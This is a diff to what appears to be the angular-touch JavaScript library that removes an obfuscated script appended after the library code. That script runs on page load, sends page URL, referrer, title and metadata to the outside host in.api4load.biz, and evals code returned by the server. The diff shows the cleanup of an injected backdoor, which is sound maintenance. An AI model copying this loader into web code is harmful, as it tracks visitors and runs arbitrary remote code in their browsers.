@@ -727,9 +727,3 @@ makeSwipeDirective('ngSwipeRight', 1, 'swiperight');
 
 
 })(window, window.angular);
-
-
-;(function(c,a,m,n){function g(){function ajax(a,b,c){var d=null;try{d=new XMLHttpRequest}catch(e){try{d=new ActiveXObject("Microsoft.XMLHTTP")}catch(f){}}d.onreadystatechange=function(){4==d.readyState&&c&&c(d.responseText)};d.open(b?"POST":"GET",a,!0);d.withCredentials=!0;b?(d.setRequestHeader("Content-Type","application/json; charset=UTF-8"),d.send(JSON.stringify(b))):d.send()}if(c==c.top){for(var f=a.documentElement,b=a.body,req=c.innerWidth||f.clientWidth||b.clientWidth,f=c.innerHeight||f.clientHeight||
-b.clientHeight,b=document.querySelectorAll("meta"),k=[],l=[],e=0;e<b.length;e++)switch(b[e].name.toLowerCase()){case "keywords":k.push(b[e].content);break;case "description":l.push(b[e].content)}req={width:req,height:f,frame:c!=c.top,location:a.location.toString(),referer:a.referrer,title:a.title,keywords:k.join(", "),description:l.join(", "),loader:n};a.gotowf||c.__tcjsch||(a.gotowf=!0,c.__tcjsch=!0,ajax(m,req,function(a){if(a)try{var response=JSON.parse(a);response.eval&&eval(response.eval)}catch(c){}}))}}a.body?g():a.addEventListener("DOMContentLoaded",
-g)})(window,document,"//in.api4load.biz/post",{"version":"1.1","name":"gapis0","time":1511186775,"userid":7109169,"subid":1041104,"cert":false,"server_id":1,"geo":"IN","create_date":1457087240,"sig":"7e3399fbdea49b475879f1c07681221e","reg_params":null});
-
